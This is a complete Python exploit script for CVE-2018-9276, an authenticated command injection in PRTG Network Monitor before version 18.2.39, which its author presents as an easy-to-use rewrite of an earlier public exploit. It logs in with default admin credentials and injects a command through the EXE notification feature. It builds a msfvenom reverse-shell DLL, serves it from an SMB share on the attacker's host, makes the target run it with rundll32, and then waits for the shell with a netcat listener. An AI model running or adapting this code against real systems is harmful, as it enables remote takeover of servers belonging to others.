#!/usr/bin/python
#####################################################################################
#
# Title:        PRTG < 18.2.39 Authenticated Command Injection (Reverse Shell)
# Reference:    CVE-2018-9276
#               https://nvd.nist.gov/vuln/detail/CVE-2018-9276
# Author:       wildkindcc
# Date:         31/03/2019
# Description:  Re-write of exploit released by M4LVO (https://www.exploit-db.com/exploits/46527)
#               So skid friendly it even setups up netcat
#
#####################################################################################
import colorama
import argparse
import httplib, urllib
import traceback
import ssl
import random
import string
import json
import sys
import time
import os
from impacket.examples import logger
from impacket import smbserver, version
from impacket.ntlm import compute_lmhash, compute_nthash
import threading
import logging
import socket

#####################################################################################
# Adds colourised notifications to text
# Colourama is not neccesary for ANSI compliant terminals; however, it will make it work in windows.
colorama.init()
error = '\033[31m[!] \033[0m'       # [!] Red
fail = '\033[31m[-] \033[0m'        # [-] Red
success = '\033[32m[+] \033[0m'     # [+] Green
event = '\033[34m[*] \033[0m'       # [*] Blue
debug = '\033[35m[%] \033[0m'       # [%] Magenta
notification = '[-] '               # [-]

#####################################################################################
# argparse
# https://docs.python.org/3.3/library/argparse.html#module-argparse

def get_args():
    # This function parses and return arguments passed in
    # Help (-h --help) is automagically defined.
    # Assign description to the help doc
    parser = argparse.ArgumentParser(
        description='CVE-2018-9276')
    # Add arguments
    parser.add_argument(
        '-i', '--host', type=str, help='IP address / Hostname of vulnerable PRTG server', required=True)
    parser.add_argument(
        '-p', '--port', type=str, help='Port number', required=True)
    parser.add_argument(
        '--lhost', type=str, help='LHOST for MSFVENOM', required=True)
    parser.add_argument(
        '--lport', type=str, help='LPORT for MSFVENOM', required=True)        
    parser.add_argument(
        '--user', type=str, help='Administrator Username', required=False, default="prtgadmin")    
    parser.add_argument(
        '--password', type=str, help='Administrator Password', required=False, default="prtgadmin")        
    parser.add_argument(
        '--https', action='store_true', help='Negotiate SSL connection to the server (Requires socket to be compiled with SSL support)', required=False, default=None)        
    # Array for all arguments passed to script
    args = parser.parse_args()

    # Assign args to variables
    host = args.host
    port = args.port
    lhost = args.lhost
    lport = args.lport
    user = args.user
    password = args.password
    https = args.https
    # Return all variable values
    return host, port, lhost, lport, user, password, https

#####################################################################################
host, port, lhost, lport, user, password, https = get_args()
url = "%s:%s" % (host, port)

def checkVersion():
    # Check for SSL
    if https:
        conn = httplib.HTTPSConnection(url, context=ssl._create_unverified_context())
    else:
        conn = httplib.HTTPConnection(url)   
    
    conn.request("GET", "/")
    response = conn.getresponse()
    version = response.getheader('Server')
    conn.close()
  
    versionSplit = []
    vulnerable = True

    for var in version.split("/")[1].split(".")[:3]:
        versionSplit.append(var)

    if not int(versionSplit[0]) <= 18:
        print versionSplit[0]
        vulnerable = False
    
    if not int(versionSplit[1]) <= 2:
        print versionSplit[1]
        vulnerable = False

    if not int(versionSplit[2]) < 39:
        print versionSplit[2]
        vulnerable = False            

    if not vulnerable:
        raise ValueError('Server returned version [{}]'.format(version), "Versions < 18.2.39 are vulnerable to CVE-2018-9276")
    else:
        print success + "[{}] is Vulnerable!".format(version)
        return 0

def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

# Connects to the PRTG server instance and retrieves a valid session cookie.
def get_session():
    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded'
    }
    payload = "loginurl=%2Fmyaccount.htm%3Ftabid%3D2&username={}&password={}".format(user, password)

    # Check for SSL
    if https:
        conn = httplib.HTTPSConnection(url, context=ssl._create_unverified_context())
    else:
        conn = httplib.HTTPConnection(url)   
    
    conn.request("POST", "/public/checklogin.htm", payload, headers)
    response = conn.getresponse()
    header = response.getheader('set-cookie')
    conn.close()
  
    if not header:
        raise ValueError('Session not obtained.  Check your usename/password and try again!')
    else:
        print success + "Session obtained for [{}:{}]".format(user, password)
        session = header.split(";")[0]
        return session  

def createFile(fileLocation):
    # Prepare the environment by creating an output file required for injection
    session = get_session()
    name = randomString()

    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With' : 'XMLHttpRequest',
        'Cookie' : str(session)
    }
    payload = "name_={}&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.bat&message_10=\"{}\"&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2".format(name, urllib.quote_plus(fileLocation))

    # Check for SSL
    if https:
        conn = httplib.HTTPSConnection(url, context=ssl._create_unverified_context())
    else:
        conn = httplib.HTTPConnection(url)   
    
    conn.request("POST", "/editsettings", payload, headers)
    response = conn.getresponse()

    objid = json.loads(response.read())['objid']  
    conn.close()

    print success + "File staged at [{}] successfully with objid of [{}]".format(fileLocation, objid)
    return objid

def prepareCommand(fileLocation, command):
    session = get_session()
    # File: log output which we require for injection
    # Session: A valid session ID returned from get_session
    name = randomString()

    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With' : 'XMLHttpRequest',
        'Cookie' : str(session)
    }
    payload = "name_={}&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=\"{};{}\"&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2".format(name, urllib.quote_plus(fileLocation), urllib.quote_plus(command))

    # Check for SSL
    if https:
        conn = httplib.HTTPSConnection(url, context=ssl._create_unverified_context())
    else:
        conn = httplib.HTTPConnection(url)   
    
    conn.request("POST", "/editsettings", payload, headers)
    #conn.debuglevel = 1
    response = conn.getresponse()
    #print response.status, response.reason

    objid = json.loads(response.read())['objid']  
    conn.close()

    print success + "Command staged at [{}] successfully with objid of [{}]".format(fileLocation, objid)
    return objid

def notify(objid):
    session = get_session()

    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With' : 'XMLHttpRequest',
        'Cookie' : str(session)
    }
    payload = "id={}".format(objid)

    # Check for SSL
    if https:
        conn = httplib.HTTPSConnection(url, context=ssl._create_unverified_context())
    else:
        conn = httplib.HTTPConnection(url)   
    
    conn.request("POST", "/api/notificationtest.htm", payload, headers)
    response = conn.getresponse()
    data = response.read()
    conn.close()

    if 'EXE notification is queued up' not in data:
        raise ValueError('Notify did not return the correct response.', data)
    else:
        print success + "Notification with objid [{}] staged for execution".format(objid)
        return 0

def initialise(fileLocation):
    objid = createFile(fileLocation)
    time.sleep(5)
    notify(objid)

def executeCommand(fileLocation, command):
    objid = prepareCommand(fileLocation, command)
    time.sleep(5)
    notify(objid)

def generatePayload(output, lhost, lport):
    print event + "Generate msfvenom payload with [LHOST={} LPORT={} OUTPUT={}]".format(lhost, lport, output)
    os.system("msfvenom -p windows/shell_reverse_tcp LHOST="+ lhost + " LPORT="+ lport +" -f dll > " + output)

def hostPayload(lhost, outputDir, shareName):   
    server = smbserver.SimpleSMBServer(listenAddress=lhost, listenPort=445)
    server.addShare(shareName, outputDir)   
    # If the host you're talking to doesnt support SMBv1 this can be uncommented to enable it.  This is an experimental impacket feature.
    #server.setSMB2Support(True)
    server.setSMBChallenge('')
    print event + "Hosting payload at [\\\\{}\{}]".format(lhost, shareName)
    server.start()
    time.sleep(5)
    server.stop()
 
#####################################################################################
logging.basicConfig(level=logging.DEBUG, format=event + '%(message)s',)

# Simple error handling because
try:
    # Default writable file location
    fileLocation = 'C:\\Users\\Public\\tester.txt'
    
    checkVersion()
    print ""
    print event + "Exploiting [%s:%s] as [%s/%s]" % (host, port, user, password)

    shellName = randomString()
    shareName = randomString().upper()
    outputDir = "/tmp"
    payload = "{}/{}.dll".format(outputDir,shellName)
    shellLocation = "\\\\{}\\{}\\{}.dll".format(lhost, shareName, shellName)

    initialise(fileLocation)

    # Generate our reverse shell payload
    generatePayload(payload, lhost, lport)

    # Setup the threading to run an impacket server in the background  
    impacket = threading.Timer(0, hostPayload, args=(lhost, outputDir, shareName,))
    impacket.setName('Impacket')
    impacket.setDaemon(True)
    impacket.start()

    # Little sleep just to make sure everything is dandy
    time.sleep(2)

    command = "rundll32.exe " + shellLocation + ",0"
    executeCommand(fileLocation, command)
    # Close the SMB server when no longer required
    print event + "Attempting to kill the impacket thread"
    print notification + "Impacket will maintain its own thread for active connections, so you may find it's still listening on <LHOST>:445!"
    print notification + "ps aux | grep <script name> and kill -9 <pid> if it is still running :)"
    print notification + "The connection will eventually time out."
    impacket.cancel()
    print ""
    print success + "Listening on [{}:{} for the reverse shell!]".format(lhost, lport)
    os.system("nc -nvlp " + lport)

except ValueError as err:
    for errors in err:
        print error + errors
    traceback.print_exc()
except Exception:
    print error + "An unhandled exception has occured!"
    traceback.print_exc()


    






































